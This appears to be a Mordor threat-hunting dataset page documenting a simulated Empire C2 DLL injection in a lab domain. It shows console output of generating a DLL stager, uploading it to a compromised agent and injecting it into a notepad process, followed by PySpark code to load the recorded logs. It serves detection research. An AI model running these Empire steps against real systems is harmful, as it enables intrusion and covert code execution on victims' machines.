# Empire DLL Injection

## Metadata


|                   |    |
|:------------------|:---|
| id                | SD-190518221344 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/05/18 |
| platform          | Windows |
| Mordor Environment| shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | https://github.com/EmpireProject/Empire/blob/dev/data/module_source/code_execution/Invoke-DllInjection.ps1 |
| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/defense_evasion/empire_dll_injection.tar.gz |

## Dataset Description
This dataset represents adversaries injects a Dll into an arbitrary process

## Adversary View
```
(Empire: listeners) > usestager windows/dll
(Empire: stager/windows/dll) > info

Name: DLL Launcher

Description:
  Generate a PowerPick Reflective DLL to inject with
  stager code.

Options:

  Name             Required    Value             Description
  ----             --------    -------           -----------
  Listener         True                          Listener to use.
  ProxyCreds       False       default           Proxy credentials
                                                ([domain\]username:password) to use for
                                                request (default, none, or other).
  Obfuscate        False       False             Switch. Obfuscate the launcher
                                                powershell code, uses the
                                                ObfuscateCommand for obfuscation types.
                                                For powershell only.
  Proxy            False       default           Proxy to use for request (default, none,
                                                or other).
  Language         True        powershell        Language of the stager to generate.
  OutFile          True        /tmp/launcher.dll File to output dll to.
  UserAgent        False       default           User-agent string to use for the staging
                                                request (default, none, or other).
  Arch             True        x64               Architecture of the .dll to generate
                                                (x64 or x86).
  ObfuscateCommand False       Token\All\1       The Invoke-Obfuscation command to use.
                                                Only used if Obfuscate switch is True.
                                                For powershell only.
  StagerRetries    False       0                 Times for the stager to retry
                                                connecting.


(Empire: stager/windows/dll) > set Listener https
(Empire: stager/windows/dll) > execute

[*] Stager output written out to: /tmp/launcher.dll

(Empire: stager/windows/dll) > agents

[*] Active agents:

Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
H3DKB8SA ps 172.18.39.106   HR001             SHIRE\nmartha           powershell         5172   5/0.0    2019-05-18 22:10:13  https           
TKV35P8X ps 172.18.39.106   HR001             *SHIRE\nmartha          powershell         5452   5/0.0    2019-05-18 22:10:13  https           
V6W3TH8Y ps 172.18.39.106   HR001             SHIRE\pgustavo          powershell         5204   5/0.0    2019-05-18 22:10:09  https           


(Empire: agents) > interact TKV35P8X
(Empire: TKV35P8X) > usemodule code_execution/invoke_dllinjection
(Empire: powershell/code_execution/invoke_dllinjection) > set Dll launcher.dll
(Empire: powershell/code_execution/invoke_dllinjection) > back
(Empire: TKV35P8X) > ps
[*] Tasked TKV35P8X to run TASK_SHELL
[*] Agent TKV35P8X tasked with task ID 29
(Empire: TKV35P8X) > ProcessName                                                     PID Arch UserName                 
-----------                                                     --- ---- --------                 
Idle                                                              0 x64  N/A                      
System                                                            4 x64  N/A                      
Registry                                                         68 x64  NT AUTHORITY\SYSTEM      
WindowsInternal.ComposableShell.Experiences.TextInput.InputApp  184 x64  SHIRE\nmartha            
svchost                                                         264 x64  NT AUTHORITY\LOCAL       
                                                                        SERVICE                  
smss                                                            276 x64  NT AUTHORITY\SYSTEM      
svchost                                                         324 x64  NT AUTHORITY\LOCAL       
                                                                        SERVICE                  
svchost                                                         352 x64  NT AUTHORITY\LOCAL       
                                                                        SERVICE                  
svchost                                                         368 x64  NT AUTHORITY\LOCAL       
                                                                        SERVICE                  
csrss                                                           372 x64  NT AUTHORITY\SYSTEM      
svchost                                                         388 x64  NT AUTHORITY\SYSTEM      
svchost                                                         432 x64  NT AUTHORITY\SYSTEM      
wininit                                                         440 x64  NT AUTHORITY\SYSTEM      
csrss                                                           448 x64  NT AUTHORITY\SYSTEM      
winlogon                                                        508 x64  NT AUTHORITY\SYSTEM      
services                                                        532 x64  NT AUTHORITY\SYSTEM      
lsass                                                           540 x64  NT AUTHORITY\SYSTEM      
svchost                                                         672 x64  NT AUTHORITY\SYSTEM      
fontdrvhost                                                     680 x64  Font Driver Host\UMFD-1  
fontdrvhost                                                     688 x64  Font Driver Host\UMFD-0  
svchost                                                         748 x64  NT AUTHORITY\SYSTEM      
svchost                                                         780 x64  NT AUTHORITY\NETWORK     
                                                                        SERVICE                  
svchost                                                         832 x64  NT AUTHORITY\SYSTEM      
svchost                                                         852 x64  NT AUTHORITY\LOCAL       
                                                                        SERVICE                  
dwm                                                             936 x64  Window Manager\DWM-1     
svchost                                                        1000 x64  NT AUTHORITY\LOCAL       
                                                                        SERVICE                  
svchost                                                        1048 x64  NT AUTHORITY\SYSTEM      
svchost                                                        1076 x64  NT AUTHORITY\NETWORK     
                                                                        SERVICE                  
svchost                                                        1164 x64  NT AUTHORITY\LOCAL       
                                                                        SERVICE                  
svchost                                                        1180 x64  NT AUTHORITY\SYSTEM      
svchost                                                        1208 x64  NT AUTHORITY\NETWORK     
                                                                        SERVICE                  
RuntimeBroker                                                  1220 x64  SHIRE\nmartha            
svchost                                                        1252 x64  NT AUTHORITY\SYSTEM      
svchost                                                        1280 x64  NT AUTHORITY\LOCAL       
                                                                        SERVICE                  
backgroundTaskHost                                             1392 x64  SHIRE\nmartha            
svchost                                                        1400 x64  NT AUTHORITY\LOCAL       
                                                                        SERVICE                  
svchost                                                        1424 x64  NT AUTHORITY\LOCAL       
                                                                        SERVICE                  
svchost                                                        1528 x64  NT AUTHORITY\LOCAL       
                                                                        SERVICE                  
svchost                                                        1572 x64  NT AUTHORITY\LOCAL       
                                                                        SERVICE                  
svchost                                                        1608 x64  NT AUTHORITY\SYSTEM      
backgroundTaskHost                                             1676 x64  SHIRE\nmartha            
Memory Compression                                             1744 x64  NT AUTHORITY\SYSTEM      
svchost                                                        1788 x64  NT AUTHORITY\SYSTEM      
svchost                                                        1800 x64  NT AUTHORITY\LOCAL       
                                                                        SERVICE                  
svchost                                                        1860 x64  NT AUTHORITY\NETWORK     
                                                                        SERVICE                  
svchost                                                        1876 x64  NT AUTHORITY\SYSTEM      
svchost                                                        1884 x64  NT AUTHORITY\SYSTEM      
SkypeApp                                                       1896 x64  SHIRE\nmartha            
svchost                                                        1924 x64  NT AUTHORITY\SYSTEM      
svchost                                                        1952 x64  NT AUTHORITY\LOCAL       
                                                                        SERVICE                  
svchost                                                        2000 x64  NT AUTHORITY\SYSTEM      
RuntimeBroker                                                  2012 x64  SHIRE\nmartha            
svchost                                                        2024 x64  NT AUTHORITY\LOCAL       
                                                                        SERVICE                  
WmiPrvSE                                                       2036 x64  NT AUTHORITY\LOCAL       
                                                                        SERVICE                  
svchost                                                        2132 x64  NT AUTHORITY\SYSTEM      
spoolsv                                                        2244 x64  NT AUTHORITY\SYSTEM      
svchost                                                        2260 x64  NT AUTHORITY\SYSTEM      
svchost                                                        2288 x64  NT AUTHORITY\NETWORK     
                                                                        SERVICE                  
svchost                                                        2372 x64  NT AUTHORITY\NETWORK     
                                                                        SERVICE                  
svchost                                                        2380 x64  NT AUTHORITY\SYSTEM      
svchost                                                        2388 x64  NT AUTHORITY\LOCAL       
                                                                        SERVICE                  
svchost                                                        2404 x64  NT AUTHORITY\SYSTEM      
Sysmon                                                         2440 x64  NT AUTHORITY\SYSTEM      
svchost                                                        2468 x64  NT AUTHORITY\SYSTEM      
svchost                                                        2492 x64  SHIRE\nmartha            
svchost                                                        2512 x64  NT AUTHORITY\SYSTEM      
wlms                                                           2528 x64  NT AUTHORITY\SYSTEM      
svchost                                                        2712 x64  NT AUTHORITY\LOCAL       
                                                                        SERVICE                  
unsecapp                                                       2824 x64  NT AUTHORITY\SYSTEM      
SkypeBackgroundHost                                            2992 x64  SHIRE\nmartha            
conhost                                                        3096 x64  SHIRE\nmartha            
notepad                                                        3124 x64  SHIRE\nmartha            
svchost                                                        3168 x64  NT AUTHORITY\SYSTEM      
RuntimeBroker                                                  3276 x64  SHIRE\nmartha            
taskhostw                                                      3288 x64  SHIRE\nmartha            
ShellExperienceHost                                            3300 x64  SHIRE\nmartha            
svchost                                                        3304 x64  SHIRE\nmartha            
svchost                                                        3368 x64  NT AUTHORITY\SYSTEM      
svchost                                                        3472 x64  NT AUTHORITY\SYSTEM      
svchost                                                        3476 x64  NT AUTHORITY\NETWORK     
                                                                        SERVICE                  
Microsoft.Photos                                               3704 x64  SHIRE\nmartha            
svchost                                                        3736 x64  NT AUTHORITY\SYSTEM      
svchost                                                        3756 x64  NT AUTHORITY\LOCAL       
                                                                        SERVICE                  
conhost                                                        3816 x64  SHIRE\nmartha            
svchost                                                        3852 x64  NT AUTHORITY\LOCAL       
                                                                        SERVICE                  
svchost                                                        3984 x64  NT AUTHORITY\SYSTEM      
MicrosoftEdgeCP                                                4044 x64  SHIRE\nmartha            
sihost                                                         4068 x64  SHIRE\nmartha            
svchost                                                        4108 x64  NT AUTHORITY\SYSTEM      
ApplicationFrameHost                                           4132 x64  SHIRE\nmartha            
ctfmon                                                         4144 x64  SHIRE\nmartha            
svchost                                                        4240 x64  NT AUTHORITY\LOCAL       
                                                                        SERVICE                  
OneDrive                                                       4352 x86  SHIRE\nmartha            
svchost                                                        4524 x64  NT AUTHORITY\SYSTEM      
explorer                                                       4592 x64  SHIRE\nmartha            
RuntimeBroker                                                  4616 x64  SHIRE\nmartha            
Windows.WARP.JITService                                        4828 x64  NT AUTHORITY\LOCAL       
                                                                        SERVICE                  
svchost                                                        4864 x64  SHIRE\nmartha            
SearchUI                                                       4928 x64  SHIRE\nmartha            
dllhost                                                        5064 x64  SHIRE\nmartha            
RuntimeBroker                                                  5152 x64  SHIRE\nmartha            
powershell                                                     5172 x64  SHIRE\nmartha            
powershell                                                     5204 x64  SHIRE\pgustavo           
svchost                                                        5300 x64  NT AUTHORITY\LOCAL       
                                                                        SERVICE                  
WmiPrvSE                                                       5312 x64  NT AUTHORITY\SYSTEM      
powershell                                                     5452 x64  SHIRE\nmartha            
dllhost                                                        5796 x64  SHIRE\nmartha            
svchost                                                        5820 x64  NT AUTHORITY\SYSTEM      
YourPhone                                                      6048 x64  SHIRE\nmartha            
svchost                                                        6160 x64  NT AUTHORITY\LOCAL       
                                                                        SERVICE                  
svchost                                                        6304 x64  NT AUTHORITY\SYSTEM      
RuntimeBroker                                                  6312 x64  SHIRE\nmartha            
svchost                                                        6336 x64  SHIRE\nmartha            
svchost                                                        6392 x64  NT AUTHORITY\SYSTEM      
SearchIndexer                                                  6464 x64  NT AUTHORITY\SYSTEM      
smartscreen                                                    6500 x64  SHIRE\nmartha            
SecurityHealthSystray                                          6560 x64  SHIRE\nmartha            
SecurityHealthService                                          6640 x64  NT AUTHORITY\SYSTEM      
SgrmBroker                                                     6672 x64  NT AUTHORITY\SYSTEM      
svchost                                                        6772 x64  NT AUTHORITY\LOCAL       
                                                                        SERVICE                  
RuntimeBroker                                                  6776 x64  SHIRE\nmartha            
taskhostw                                                      6792 x64  SHIRE\nmartha            
svchost                                                        6856 x64  NT AUTHORITY\SYSTEM      
svchost                                                        7248 x64  NT AUTHORITY\NETWORK     
                                                                        SERVICE                  
svchost                                                        7292 x64  NT AUTHORITY\SYSTEM      
svchost                                                        7844 x64  NT AUTHORITY\SYSTEM      
WmiPrvSE                                                       7944 x64  NT AUTHORITY\NETWORK     
                                                                        SERVICE                  
conhost                                                        7976 x64  SHIRE\pgustavo           
MicrosoftEdgeSH                                                8376 x64  SHIRE\nmartha            
svchost                                                        8516 x64  NT AUTHORITY\SYSTEM      
RuntimeBroker                                                  8804 x64  SHIRE\nmartha            
MicrosoftEdge                                                  9012 x64  SHIRE\nmartha            
browser_broker                                                 9108 x64  SHIRE\nmartha            
Windows.WARP.JITService                                        9160 x64  NT AUTHORITY\LOCAL       
                                                                        SERVICE

(Empire: TKV35P8X) > upload /tmp/launcher.dll
[*] Tasked agent to upload launcher.dll, 155 KB
[*] Tasked TKV35P8X to run TASK_UPLOAD
[*] Agent TKV35P8X tasked with task ID 30
(Empire: TKV35P8X) > usemodule code_execution/invoke_dllinjection
(Empire: powershell/code_execution/invoke_dllinjection) > set ProcessID 3124
(Empire: powershell/code_execution/invoke_dllinjection) > execute
[*] Tasked TKV35P8X to run TASK_CMD_WAIT
[*] Agent TKV35P8X tasked with task ID 31
[*] Tasked agent TKV35P8X to run module powershell/code_execution/invoke_dllinjection
(Empire: powershell/code_execution/invoke_dllinjection) > System.Diagnostics.ProcessModule (launcher.dll)
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/defense_evasion/empire_dll_injection.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        